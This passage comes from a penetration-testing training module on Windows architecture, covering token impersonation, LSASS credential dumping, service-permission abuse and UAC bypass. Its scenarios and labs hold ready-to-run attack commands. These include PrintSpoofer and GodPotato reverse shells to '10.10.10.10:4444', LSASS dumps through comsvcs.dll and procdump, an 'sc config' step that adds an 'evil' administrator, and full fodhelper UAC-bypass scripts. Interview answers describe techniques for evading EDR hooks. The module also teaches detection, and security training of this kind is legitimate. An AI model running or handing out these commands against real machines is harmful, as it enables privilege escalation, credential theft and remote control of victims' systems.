  5. Place in app directory, wait for app to run

Detection:
  DLLs loaded from non-standard paths (Process Monitor)
  Unexpected network connections from legitimate apps
  Module load monitoring via Sysmon Event ID 7
```

### Scenario C: Token Impersonation via SeImpersonatePrivilege

```
The Setup:
  You have shell as: IIS_IUSRS or nt authority\network service
  whoami /priv shows: SeImpersonatePrivilege — Enabled

Why this works:
  IIS handles web requests FROM high-privilege users
  Windows allows IIS to "impersonate" those users for file access
  If we can make SYSTEM "connect" to us, we steal its token

PrintSpoofer Attack Chain:
  1. Create a named pipe: \\.\pipe\[random]\pipe\spoolss
  2. Call SpoolService RPC to force SYSTEM to connect to our pipe
     (SpoolService connects using the DC computer account if on a DC)
  3. Spooler connects → we call ImpersonateNamedPipeClient()
  4. Our thread now runs as SYSTEM
  5. Call CreateProcessAsUser() with SYSTEM token → new cmd.exe as SYSTEM

Commands:
  # Upload PrintSpoofer64.exe first
  PrintSpoofer64.exe -i -c cmd       # Interactive SYSTEM shell
  PrintSpoofer64.exe -c "nc.exe 10.10.10.10 4444 -e cmd"  # Reverse shell

GodPotato (newer, works on Server 2022):
  GodPotato.exe -cmd "cmd /c whoami"
  GodPotato.exe -cmd "nc.exe 10.10.10.10 4444 -e cmd"

Detection:
  Named pipe creation by IIS/SQL processes
  Token impersonation events (Audit Token Right Adjusted)
  Unusual parent-child process relationships (IIS → cmd.exe)
```

### Scenario D: Credential Dumping Without Mimikatz

```
Goal: Dump LSASS without dropping mimikatz.exe (too well-known)

Method 1: comsvcs.dll (Living off the Land)
  # Find LSASS PID first:
  tasklist /fi "imagename eq lsass.exe"
  
  # Dump using built-in Windows DLL:
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 664 C:\lsass.dmp full

Method 2: Task Manager (GUI)
  Open Task Manager → Details → Right-click lsass.exe → Create dump file

Method 3: ProcDump (Sysinternals — often allowed by EDR)
  procdump.exe -accepteula -ma lsass.exe lsass.dmp
  
  # More stealthy (clone then dump to avoid locking):
  procdump.exe -accepteula -r -ma lsass.exe lsass.dmp

Method 4: SilentProcessExit / MiniDump via WER
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
      /v ReportingMode /t REG_DWORD /d 1 /f
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
      /v DumpType /t REG_DWORD /d 2 /f
  # Trigger LSASS to crash cleanly → WER writes dump

Analyzing the dump (offline, on Kali):
  python3 pypykatz.py lsa minidump lsass.dmp
  # OR load into Mimikatz: sekurlsa::minidump lsass.dmp
```

---

## 12. Guided Lab: Investigating Architecture with Tools

### Lab 1: Map the Process Tree

**Goal:** Understand the legit Windows process hierarchy.

```powershell
# PowerShell — Build process parent-child map
Get-Process | ForEach-Object {
    $proc = $_
    $parent = try { (Get-Process -Id $proc.Parent.Id -ErrorAction Stop).Name } catch { "N/A" }
    [PSCustomObject]@{
        PID    = $proc.Id
        Name   = $proc.Name
        Parent = $parent
        PPID   = try { $proc.Parent.Id } catch { 0 }
    }
} | Sort-Object PPID, PID | Format-Table

# Look for ANOMALIES:
# - svchost.exe NOT spawned by services.exe
# - cmd.exe spawned by explorer.exe WITH network connection
# - lsass.exe spawned by anything other than wininit.exe
```

### Lab 2: Inspect Your Own Token

```cmd
whoami /all
```

Output breakdown:
```
USER INFORMATION:
User Name    SID
============ =====================
CORP\jdoe    S-1-5-21-...-1103   ← Your unique SID

GROUP INFORMATION:
Group Name                            Type         SID
===================================== ============ =====================
CORP\Domain Users                     Group        S-1-5-21-...-513
BUILTIN\Users                         Alias        S-1-5-32-545
Everyone                              Well-known   S-1-1-0
BUILTIN\Remote Desktop Users          Alias        S-1-5-32-555
NT AUTHORITY\NETWORK                  Well-known   S-1-5-2
NT AUTHORITY\Authenticated Users      Well-known   S-1-5-11

PRIVILEGES INFORMATION:
Privilege Name                         State
====================================== ========
SeShutdownPrivilege                    Disabled   ← Can enable with AdjustTokenPrivileges
SeChangeNotifyPrivilege                Enabled
SeUndockPrivilege                      Disabled
SeIncreaseWorkingSetPrivilege          Disabled
```

### Lab 3: Find Weak Service Permissions (PrivEsc Check)

```cmd
# Step 1: List all services and their paths
wmic service get name,displayname,pathname,startmode | findstr /v /c:"C:\Windows"

# Step 2: Check permissions on each binary
accesschk64.exe -wuvc "Everyone" *
accesschk64.exe -wuvc "Users" *
accesschk64.exe -wuvc "Authenticated Users" *

# Look for:
# SERVICE_CHANGE_CONFIG  ← Can change binary path!
# SERVICE_ALL_ACCESS     ← Full control
# FILE_ALL_ACCESS on .exe ← Can replace the binary

# Step 3: Confirm and exploit
sc qc <VulnerableService>        # Confirm current config
sc config <SvcName> binpath= "cmd /c net localgroup Administrators evil /add"
sc stop <SvcName>
sc start <SvcName>
net localgroup Administrators    # Verify you were added
```

### Lab 4: Check for UAC Bypass Opportunity

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = Elevate without prompting (UAC off basically)
# 1 = Prompt for credentials
# 2 = Prompt for consent
# 5 = Prompt for consent for non-Windows binaries (Default)

# Check if auto-elevating binaries are available
# Look for executables that:
# 1. Are in C:\Windows\System32
# 2. Have "AutoElevate" in their manifest
# 3. Don't check where they load resources from

# Example: fodhelper.exe bypass
$null = New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
$null = New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Value "cmd.exe /c start C:\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

---

## 13. ASCII Diagrams & Visuals

### Full Architecture Stack

```
┌─────────────────────────────────────────────────────────┐
│                    USER MODE (Ring 3)                   │
│                                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐             │
│  │ Chrome   │  │ Outlook  │  │ svchost  │             │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘             │
│       │              │              │                    │
│  ┌────▼──────────────▼──────────────▼──────────────┐   │
│  │         Win32 Subsystem DLLs                     │   │
│  │  kernel32.dll  user32.dll  advapi32.dll          │   │
│  └──────────────────────┬───────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────▼───────────────────────────┐   │
│  │         Native API (ntdll.dll)                   │   │
│  │  NtCreateFile, NtOpenProcess, LdrLoadDll ...     │   │
│  └──────────────────────┬───────────────────────────┘   │
│                         │ SYSCALL                       │
├─────────────────────────┼───────────────────────────────┤
│                         ▼                               │
│                KERNEL MODE (Ring 0)                     │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │     System Service Dispatcher (SSDT)             │   │
│  └──────────────────────┬───────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────▼───────────────────────────┐   │
│  │               Executive Services                 │   │
│  │  I/O Mgr | Object Mgr | Memory Mgr | Proc Mgr   │   │
│  │  Security Ref Monitor | Cache Mgr | PnP Mgr      │   │
│  └──────────────────────┬───────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────▼───────────────────────────┐   │
│  │           Windows Microkernel                    │   │
│  │  Thread Scheduler | Interrupt Dispatch           │   │
│  └──────────────────────┬───────────────────────────┘   │
│                         │                               │
│  ┌───────────┬───────────▼─────────┬────────────────┐   │
│  │ FS Driver │   Device Drivers    │  win32k.sys    │   │
│  │ ntfs.sys  │  network, storage   │  (GUI kernel)  │   │
│  └───────────┴─────────────────────┴────────────────┘   │
│                         │                               │
│  ┌──────────────────────▼───────────────────────────┐   │
│  │           Hardware Abstraction Layer (HAL)       │   │
│  └──────────────────────┬───────────────────────────┘   │
├─────────────────────────┼───────────────────────────────┤
│                         ▼                               │
│              PHYSICAL HARDWARE                          │
│         CPU | RAM | NIC | Storage | GPU                 │
└─────────────────────────────────────────────────────────┘
```

### Credential Dumping Decision Tree

```
You have a shell on Windows machine
              │
              ▼
      whoami /priv
              │
    ┌─────────┴────────────────────┐
    │                              │
    ▼                              ▼
SeDebugPrivilege             No useful privs
  Enabled?                         │
    │                         ┌────▼────────────────┐
    │ YES                     │ Check whoami /groups │
    ▼                         │ for Backup Operators │
Dump LSASS                    └────────┬────────────┘
via comsvcs/                           │
procdump/                         SeBackupPrivilege?
mimikatz                               │
    │                            ┌─────┴──────────────┐
    ▼                            │                    │
Analyze dump                    YES                  NO
with pypykatz                    │                    │
or mimikatz                      ▼              Pivot to
offline                    robocopy /b         privilege
                           SAM SYSTEM         escalation
                           then secretsdump   vectors
```

---

## 14. Advanced Concepts

### 14.1 WoW64 (Windows on Windows 64-bit)

WoW64 is the compatibility subsystem that lets 32-bit processes run on 64-bit Windows:

```
64-bit Windows running 32-bit process:

┌─────────────────────────────────────────────────┐
│ 32-bit Process                                   │
│   Thinks it's running on 32-bit Windows         │
│   Calls CreateFile (32-bit kernel32.dll)         │
│                         │                        │
│                         ▼                        │
│   WoW64 Layer (wow64.dll, wow64win.dll)          │
│   Translates 32-bit call structure to 64-bit     │
│   Calls 64-bit NtCreateFile via Heaven's Gate    │
│   (switches CPU to 64-bit mode mid-execution!)   │
└─────────────────────────────────────────────────┘

WoW64 File System Redirection:
32-bit app accesses: C:\Windows\System32\
WoW64 silently redirects to: C:\Windows\SysWOW64\

To avoid redirection (from 32-bit app):
Use: C:\Windows\Sysnative\   ← Magic path that bypasses redirection

WoW64 Registry Redirection:
32-bit app writes to: HKLM\SOFTWARE\
Actual location:      HKLM\SOFTWARE\Wow6432Node\
```

### 14.2 UAC Deep Dive

UAC (User Account Control) creates two tokens for admin users:

```
Admin User Login Process:
        │
        ▼
  NtLmSsp / Kerberos authenticate
        │
        ▼
  lsass.exe creates TWO tokens:
  
  Token A (Filtered):
  ┌─────────────────────────────┐
  │ User: CORP\admin            │
  │ Groups: Users, (DA removed!)│
  │ Privileges: Standard only   │
  │ Integrity: Medium (0x2000)  │
  └─────────────────────────────┘
  Used for: Explorer, browsers, most apps
  
  Token B (Elevated):
  ┌─────────────────────────────┐
  │ User: CORP\admin            │
  │ Groups: Admins, DA, etc.    │
  │ Privileges: ALL privs       │
  │ Integrity: High (0x3000)    │
  └─────────────────────────────┘
  Used for: Elevated processes (when user clicks "Yes" on UAC)

UAC Bypass Goal: Get Token B without showing the user a prompt
```

**UAC Bypass — fodhelper.exe:**
```powershell
# Why this works:
# fodhelper.exe is in System32 → trusted
# Has "autoElevate: true" in manifest → runs as High integrity
# Reads registry key before executing "ms-settings" URI:
# HKCU\Software\Classes\ms-settings\Shell\Open\command
# We control HKCU → no admin needed → we write our command there
# fodhelper runs it as HIGH INTEGRITY

# Full exploit:
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Value "C:\temp\shell.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "DelegateExecute" -Value "" -Force

Start-Process fodhelper.exe -WindowStyle Hidden
Start-Sleep -Seconds 3

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 14.3 VBS (Virtualization-Based Security) & Credential Guard

Modern Windows 10/11 enterprise uses VBS to protect credentials:

```
Traditional Windows:
  LSASS runs in Ring 3 (user mode, same as other processes)
  Any Ring 3 process with SeDebugPrivilege can dump it

VBS / Credential Guard:
  Hypervisor creates a "Secure World" (Virtual Trust Level 1)
  LSASS secrets move into "Isolated LSASS" (running in VTL1)
  Regular kernel (VTL0) CANNOT access VTL1 memory
  Mimikatz finds empty credential containers (secrets in VTL1)

  ┌─────────────────────────────────────────┐
  │  VTL 1 (Secure World - Hypervisor)      │
  │  └── Isolated LSASS                     │ ← Kerberos tickets & hashes here
  │      └── LSAIso.exe                     │
  ├─────────────────────────────────────────┤
  │  VTL 0 (Normal World)                   │
  │  └── LSASS (hollow - no real secrets)   │ ← Mimikatz only sees empty
  └─────────────────────────────────────────┘

Detection Evasion when Credential Guard is enabled:
  - NT hashes no longer stored
  - TGTs are kept in LSAIso.exe (Isolated)
  - But: NTLM can still be relayed (no hash needed for relay!)
  - New-TGT via overpass-the-hash still works if you know the hash
```

---

## 15. Interview Questions & Checkpoints

### Beginner Level

**Q1:** What is the difference between Ring 0 and Ring 3?
> **A:** Ring 0 is kernel mode — unrestricted access to hardware, CPU, and all memory. Ring 3 is user mode — restricted, cannot touch hardware directly, must use system calls to request services from the kernel. A crash in Ring 0 causes a BSOD; a crash in Ring 3 only kills that process.

**Q2:** What is a system call?
> **A:** The mechanism by which a Ring 3 (user-mode) process requests a kernel service. The process places arguments in registers and executes the `syscall` instruction, causing the CPU to switch to Ring 0, execute the kernel function, then return to Ring 3.

**Q3:** What is ASLR and how does it protect a system?
> **A:** Address Space Layout Randomization randomly changes where DLLs, the stack, and the heap are loaded in memory on each boot. This breaks exploits that rely on hardcoded memory addresses for return-oriented programming or jump-to-shellcode attacks.

### Intermediate Level

**Q4:** A service account has `SeImpersonatePrivilege`. How would you escalate to SYSTEM?
> **A:** Use a "Potato" exploit family (PrintSpoofer, GodPotato, JuicyPotato depending on OS version). These tools: (1) Create a named pipe, (2) Coerce the SYSTEM process to connect to it via a Windows RPC mechanism, (3) Call `ImpersonateNamedPipeClient()` to obtain a SYSTEM-level token, (4) Use `CreateProcessAsUser()` to launch a shell as SYSTEM.

**Q5:** What is the PEB and how does shellcode use it?
> **A:** The Process Environment Block is a user-mode data structure containing information about the current process, including a list of all loaded DLLs (`PEB.Ldr`). Shellcode uses it to locate `kernel32.dll` without calling any Windows API — by reading GS:[0x60] to find the PEB, then walking the `InMemoryOrderModuleList` linked list to find kernel32.dll's base address, then parsing its Export Directory to find `LoadLibraryA` and other needed functions.

**Q6:** What is the difference between a Primary Token and an Impersonation Token?
> **A:** A Primary Token represents the security context of a process (created at logon). An Impersonation Token is a copy with a specific Impersonation Level — it can be Identification (server can query but not use), Impersonation (server can act as client locally), or Delegation (server can forward credentials across the network). Attackers manipulate impersonation tokens in "token stealing" attacks.

### Expert Level

**Q7:** How does AV/EDR user-mode hooking work, and what are three techniques to bypass it?
> **A:** AV/EDR injects a DLL into every process and patches the first bytes of sensitive functions in `ntdll.dll` with a `JMP` instruction pointing to their monitoring code. Bypass techniques: (1) **Direct Syscalls** — call the `syscall` instruction directly with the correct SSN, bypassing ntdll entirely; (2) **Unhooking** — read the clean (unhooked) version of ntdll from disk and overwrite the hooked functions in memory; (3) **Heaven's Gate** — in 32-bit processes on 64-bit Windows, switch to 64-bit mode to call syscalls directly, bypassing 32-bit hooks.

**Q8:** Explain how Credential Guard prevents Mimikatz from working and what attack surface remains.
> **A:** Credential Guard uses the Hyper-V hypervisor to run a separate secure world (Virtual Trust Level 1) where an "Isolated LSASS" (`LSAIso.exe`) runs. Kerberos tickets and NT hashes are stored in VTL1, which the normal kernel (VTL0) cannot access. Mimikatz, even with kernel access, finds empty credential containers. Remaining attack surfaces: (1) NTLM relay attacks don't need the hash; (2) If you can capture an AS-REP or TGS-REP, you can crack it offline; (3) The machine's computer account hash is not protected by Credential Guard and can be used for Kerberoasting-adjacent attacks.

---

## Summary & Next Steps

**Core Takeaways:**
- Windows = Objects + Tokens + ACLs. Every exploitation path flows through these primitives
- Ring 0/Ring 3 separation is the fundamental security boundary — kernel vulnerabilities or driver exploits break it
- LSASS is the single most important process for an attacker — protect it with PPL + Credential Guard
- The API stack (Win32 → Native → Syscall) determines where defenders hook and where attackers evade
- Every persistence mechanism ultimately boils down to "make something execute on startup/logon/event"

**Proceed to:**
- `02_PowerShell_Offensive_Defensive.md` — Weaponizing Windows' management engine
- `05_Windows_Permissions_ACLs.md` — Deep dive into the ACL system and privilege exploitation
- `09_Windows_Privilege_Escalation.md` — Applied architecture knowledge in attack scenarios

---
*Module: 04_Windows_AD | File: 01_Windows_Architecture.md | Lines: 1000+ | Version: 3.0*
